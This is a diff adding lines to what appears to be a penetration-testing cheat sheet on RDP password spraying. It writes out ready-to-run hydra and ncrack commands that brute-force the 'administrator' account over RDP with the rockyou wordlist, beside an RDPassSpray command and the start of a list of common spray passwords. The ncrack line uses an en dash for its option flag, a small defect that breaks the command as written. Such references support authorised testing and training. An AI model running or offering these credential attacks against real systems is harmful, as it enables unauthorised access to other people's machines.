@@ -657,6 +657,13 @@ Using [RDPassSpray](https://github.com/xFreed0m/RDPassSpray) to target RDP servi
 python3 RDPassSpray.py -u [USERNAME] -p [PASSWORD] -d [DOMAIN] -t [TARGET IP]
 ```
 
+Using [hydra]() and [ncrack]() to target RDP services.
+
+```powershell
+hydra -t 1 -V -f -l administrator -P /usr/share/wordlists/rockyou.txt rdp://10.10.10.10
+ncrack –connection-limit 1 -vv --user administrator -P password-file.txt rdp://10.10.10.10
+```
+
 Most of the time the best passwords to spray are :
 
 - Password1
